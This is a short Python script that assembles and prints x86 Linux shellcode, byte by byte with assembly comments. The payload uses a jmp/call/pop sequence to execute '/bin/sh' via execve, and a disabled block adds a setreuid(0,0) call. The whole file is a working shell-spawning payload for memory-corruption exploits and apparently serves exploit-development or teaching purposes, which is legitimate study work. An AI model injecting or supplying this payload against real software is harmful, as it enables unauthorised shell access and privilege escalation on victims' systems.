#!/usr/bin/env python
import sys

shellcode = ""

if False:
    shellcode += "\x31\xC0"              # xor eax, eax
    shellcode += "\xB0\x46"              # mov al, 0x46
    shellcode += "\x31\xDB"              # xor ebx, ebx
    shellcode += "\x31\xC9"              # xor ecx, ecx
    shellcode += "\xCD\x80"              # int 0x80
shellcode += "\xEB\x16"              # jmp 0x22                       =>.
shellcode += "\x5B"                  # pop ebx                          '
shellcode += "\x31\xC0"              # xor eax, eax                     |
shellcode += "\x88\x43\x07"          # mov byte [ebx + 7], al           |
shellcode += "\x89\x5B\x08"          # mov dword [ebx + 8], ebx         |
shellcode += "\x89\x43\x0C"          # mov dword [ebx + 0xc], eax       |
shellcode += "\xB0\x0B"              # mov al, 0xb                      |
shellcode += "\x8D\x4B\x08"          # lea ecx, [ebx + 8]               |
shellcode += "\x8D\x53\x0C"          # lea edx, [ebx + 0xc]             |
shellcode += "\xCD\x80"              # int 0x80                         |
shellcode += "\xE8\xE5\xFF\xFF\xFF"  # call 0xc                       <-'
shellcode += "\x2F\x62\x69\x6E\x2F\x73\x68\x58\x41"
shellcode += "\x41\x41\x41\x42\x42\x42\x42"

sys.stdout.write(shellcode)
